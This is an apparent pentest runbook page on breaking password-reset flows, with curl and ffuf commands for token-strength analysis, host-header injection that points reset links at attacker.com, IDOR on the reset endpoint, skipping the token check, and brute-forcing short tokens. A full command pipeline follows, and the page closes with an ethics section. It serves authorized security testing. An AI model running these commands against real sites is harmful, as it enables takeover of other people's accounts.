---
title: "Reset / Forgotten Password Bypass"
description: "Breaking password reset flows via weak tokens, host header injection, IDOR, and response manipulation to take over accounts."
phase: Web
order: 68
tags:
  - password-reset
  - account-takeover
  - token
  - idor
tools:
  - curl
  - ffuf
  - jq
updated: 2026-10-01
---

A password-reset runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: break the unauthenticated credential-write path — weak tokens, host-header poisoning, IDOR, or response tampering — and prove takeover on accounts you control.

## 1. Map the full flow

Capture request, token delivery, token validation, and password write.

```bash
# Request a reset for a canary account
curl -s -X POST "https://target.com/api/password/forgot" \
  -H "Content-Type: application/json" \
  -d '{"email":"canary@test.com"}' | jq .

# Complete the reset (token from your own inbox)
curl -s -X POST "https://target.com/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"canary@test.com","token":"<token>","password":"NewPass1!"}' | jq .
```

Note the reset link's host, parameters, and where the token is accepted.

## 2. Analyze token strength

```bash
for i in $(seq 1 5); do
  curl -s -X POST "https://target.com/api/password/forgot" \
    -H "Content-Type: application/json" \
    -d '{"email":"canary@test.com"}'
done
```

Look for sequential values, timestamps, short entropy, derivation from the email, missing expiry, or missing single-use enforcement (reuse the same token twice).

## 3. Host header injection

```bash
curl -s -X POST "https://target.com/api/password/forgot" \
  -H "Host: attacker.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"canary@test.com"}' | jq .
```

Inspect the received email/link for your controlled host.

## 4. IDOR on the reset endpoint

```bash
# Token issued for your account, email swapped to another
curl -s -X POST "https://target.com/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"second-canary@test.com","token":"<my-token>","password":"NewPass1!"}' | jq .
```

Also try changing the token or username to another user's value and check whether the token is bound to the account it was issued for.

## 5. Response manipulation and step skipping

```bash
# Skip the token check by calling the final step
curl -s -X POST "https://target.com/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"canary@test.com","password":"NewPass1!"}' | jq .

# Brute force short tokens while watching rate limits
ffuf -u "https://target.com/api/password/reset?token=FUZZ" \
  -w tokens.txt -mc 200 -fs 0 -rate 5
```

## Full pipeline

```bash
B="https://target.com/api"
EMAIL="canary@test.com"

# 1. Trigger reset
curl -s -X POST "$B/password/forgot" -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\"}" | jq .

# 2. Host header injection attempt
curl -s -X POST "$B/password/forgot" \
  -H "Host: attacker.com" -H "X-Forwarded-Host: attacker.com" \
  -H "Content-Type: application/json" -d "{\"email\":\"$EMAIL\"}" | jq .

# 3. Complete with your token
curl -s -X POST "$B/password/reset" -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\",\"token\":\"<token>\",\"password\":\"NewPass1!\"}" | jq .

# 4. IDOR: valid token aimed at another account
curl -s -X POST "$B/password/reset" -H "Content-Type: application/json" \
  -d '{"email":"second-canary@test.com","token":"<token>","password":"NewPass1!"}' | jq .

# 5. Step skip (no token)
curl -s -X POST "$B/password/reset" -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\",\"password\":\"NewPass1!\"}" | jq .
```

## Ethics & legality

- Only reset passwords for accounts you own or are explicitly authorized to test.
- Never complete a takeover of a real user's account; stop at the proof of weakness.
- Keep brute-force attempts minimal and within program rate limits.
- Redact tokens and email addresses in the report.
